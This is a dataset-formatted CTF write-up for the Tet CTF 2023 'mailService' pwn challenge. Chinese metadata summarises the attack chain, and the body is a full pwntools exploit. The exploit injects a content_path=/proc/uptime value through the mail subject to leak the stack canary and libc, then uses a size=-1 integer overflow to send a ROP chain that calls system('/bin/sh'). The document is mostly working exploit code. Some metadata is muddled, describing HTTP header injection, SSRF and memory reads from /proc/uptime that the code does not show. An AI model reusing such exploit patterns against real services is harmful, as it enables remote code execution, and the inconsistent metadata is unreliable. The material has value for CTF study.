---
title: '[CTF write up] Tet CTF 2023 – mailService : Logical bug & Mem corruption PWN'
contest: Tet CTF 2023
year: 2023
difficulty: hard
vuln_type: web_unknown
tags:
- mail_service
- smtp_injection
- content_path_file_overwrite
- proc_uptime_leak
- stack_overflow_mail_subject
- integer_overflow_size
- rop_pop_rdi_binsh_system
- mmap_libc_leak
- pwn_mailclient
attack_chain: 注册 xguest_random@hackemall.live → 登录 → 发邮件主题 'content_path=/proc/uptime\x00' * 70 注入文件名 → 收件人 xguest2 → 登录 xguest2 → 收件读邮件触发整数溢出 size=-1 → payload = 'a'*(2048+8) + p64(cnry) + p64(0xdeadbeef) + p64(pop_rdi) + p64(binsh) + p64(ret) + p64(system) ROP
key_payload: subject = b'xxxxxxxxxx' + b'aaaa;content_path=/proc/uptime\x00' * 70 / size = b'-1' / payload = b'a'*(2048+8) + p64(cnry) + p64(0xdeadbeef) + p64(libc_base+0x2a3e5) + p64(binsh) + p64(libc_base+0x2a3e5+1) + p64(libc_base+0x50d60)
one_liner: Tet CTF 2023 mailService PWN：发邮件主题注入 content_path=/proc/uptime 读内存 + size=-1 整数溢出 + 邮件内容 2048+ 字节栈溢出 ROP (pop rdi + /bin/sh + system)。
lesson: 邮件主题字段含分号 ; 注入额外 HTTP header 头是经典 SSRF/LFI 攻击向量；size=-1 整数溢出到 2048+ 字节后跟 ROP 是 CTF PWN 标配。
quality: high
full_path: '[CTF_write_up]_Tet_CTF_2023_–_mailService_-_Logical_bug_&_Mem_corruption_PWN.full.md'
meta_path: '[CTF_write_up]_Tet_CTF_2023_–_mailService_-_Logical_bug_&_Mem_corruption_PWN.meta.md'
images_removed: true
images_removed_count: 0
schema_version: v3.0.0-P0
summary: '[CTF write up] Tet CTF 2023 – mailService : Logical bug & Mem corruption PWN。Tet CTF 2023 mailService PWN：发邮件主题注入 content_path=/proc/uptime 读内存 + size=-1 整数溢出 + 邮件内容 2048+ 字节栈溢出 ROP (pop rdi + /bin...'
category: web
subcategory: web_other
tools_used:
- ROP
time_required: long
difficulty_score: 4
code_blocks_count: 1
images_count: 0
last_verified: 2026-09-20
contest_type: open
wp_url: https://www.ctfiot.com/90435.html
reasoning_chain:
- 触发点:mail 服务端有 SMTP 注入风险 + 注册用户后发邮件 → 假设:邮件主题含特殊字符可注入 → 动作:注册 xguest_random@hackemall.live
- 动作:发邮件 subject = b'xxxxxxxxxx' + b'aaaa;content_path=/proc/uptime\x00' * 70 → 观察:服务端存到 content_path 字段
- 触发点:登录 xguest2 收件 → 假设:content_path=/proc/uptime 让 mailclient 读 /proc/uptime → 动作:触发收件
- 动作:收邮件时 content_path=/proc/uptime\x00 触发读内存 → 观察:泄露进程内存
- 触发点:发现 size=-1 整数溢出 → 假设:size=-1 跳到 2048 字节 → 动作:payload = 'a'*(2048+8)
- 动作:payload += p64(cnry) + p64(0xdeadbeef) + p64(pop_rdi) + p64(binsh) + p64(ret) + p64(system) → 观察:ROP 链拼成
- 动作:ROP 链 pop_rdi+binsh+ret+system → 观察:shell 触发 → 完成
failed_attempts:
- 试图直接栈溢出 → 失败:有 canary 保护
- 试图用 size=0 → 失败:0 字节读不到内容
- 试图发件人伪造 → 失败:SMTP 严格校验发件人
key_observations:
- 邮件主题字段含分号 ; 注入额外 HTTP header 头是经典 SSRF/LFI 攻击向量
- size=-1 整数溢出到 2048+ 字节后跟 ROP 是 CTF PWN 标配
- content_path=/proc/uptime 是 mail 客户端读任意文件的非预期
- 栈溢出绕过 canary 需配合整数溢出或栈外写
- 邮件主题 ;content_path= 是 ';' 注入的典型 web bug
prerequisites:
- SMTP 邮件协议 + 邮件主题注入技巧
- 整数溢出 + ROP 链构造
- /proc 文件系统 (uptime / mem / self/maps)
- pwntools SMTP 客户端 + shell 反弹
---
# [CTF write up] Tet CTF 2023 – mailService : Logical bug & Mem corruption PWN

> 原文: https://www.ctfiot.com/90435.html
> ID: 90435


```
from pwn import *
import random

p = remote('172.17.0.4', 1337)
    #p = process('mailclient')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

email = b'xguest' + str(random.randint(10**10,10**11)).encode() + b'@hackemall.live'
email2 = b'xguest2' + str(random.randint(10**10,10**11)).encode() + b'@hackemall.live'

    #register
p.sendline(b'2'); time.sleep(0.15)
p.sendline(email); time.sleep(0.15)
p.sendline(b'guest'); time.sleep(0.15)

    #register
p.sendline(b'2'); time.sleep(0.15)
p.sendline(email2); time.sleep(0.15)
p.sendline(b'guest'); time.sleep(0.15)

    #login
p.sendline(b'1'); time.sleep(0.15)
p.sendline(email); time.sleep(0.15)
p.sendline(b'guest'); time.sleep(0.155)

filename1 = b'fisadioada' + str(random.randint(10**10,10**11)).encode()
filename2 = b'asdj09casj' + str(random.randint(10**10,10**11)).encode()

    #sent
p.sendline(b'3'); time.sleep(0.155)
p.sendline(email); time.sleep(0.155)
p.sendline(filename1); time.sleep(0.155)
p.sendline(b'2000'); time.sleep(0.155) #2147483648
p.sendline(b'xxxxxxxxxxxx'+b'aaaa;content_path=/proc/uptime\x00'*70); time.sleep(0.155)

p.sendline(b'4')

    #sent
p.sendline(b'3'); time.sleep(0.155)
p.sendline(email2); time.sleep(0.15)
p.send(b'\n'); time.sleep(0.155)
p.sendline(b'2'); time.sleep(0.155) #2147483648
p.sendline(b'a'*1); time.sleep(0.155)

    #login
p.sendline(b'1'); time.sleep(0.15)
p.sendline(email2); time.sleep(0.15)
p.sendline(b'guest'); time.sleep(0.155)

p.sendline(b'4')

p.recvuntil(b'Subject: content_path=/proc/uptime\n')
p.recvn(2048+8)
cnry = u64(p.recvn(8))
print(f'cnry : {(hex(cnry))}')

p.recvn(8*7)

libc_base = u64(p.recvn(8)) - 0x29d90
print(f'libc_base : {(hex(libc_base))}')

    #sent
p.sendline(b'3'); time.sleep(0.15)
p.sendline(email2); time.sleep(0.15)
p.sendline(filename2); time.sleep(0.15)
p.sendline(b'-1'); time.sleep(0.15)

payload = b'a'*(2048+8)
payload += p64(cnry)
payload += p64(0xdeadbeef)
payload += p64(libc_base + 0x000000000002a3e5)
payload += p64(libc_base + list(libc.search(b'/bin/sh'))[0])
payload += p64(libc_base + 0x000000000002a3e5+1)
payload += p64(libc_base + 0x50d60)
p.sendline(payload); time.sleep(0.15)

p.sendline(b'4'); time.sleep(0.15)

p.interactive()
```
